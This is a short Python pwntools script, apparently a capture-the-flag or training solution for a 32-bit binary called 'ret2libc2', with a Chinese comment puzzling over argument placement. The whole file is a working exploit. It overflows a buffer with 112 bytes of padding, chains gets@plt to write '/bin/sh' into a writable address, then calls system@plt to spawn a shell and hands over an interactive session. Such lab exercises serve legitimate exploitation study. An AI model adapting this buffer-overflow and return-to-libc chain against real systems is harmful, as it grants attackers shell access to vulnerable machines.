##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080

payload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')

# 下面这种情况需要输入‘/bin/sh’，为什么不能把参数放在flat方法里？？？
# payload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
# sh.sendline(payload)

sh.interactive()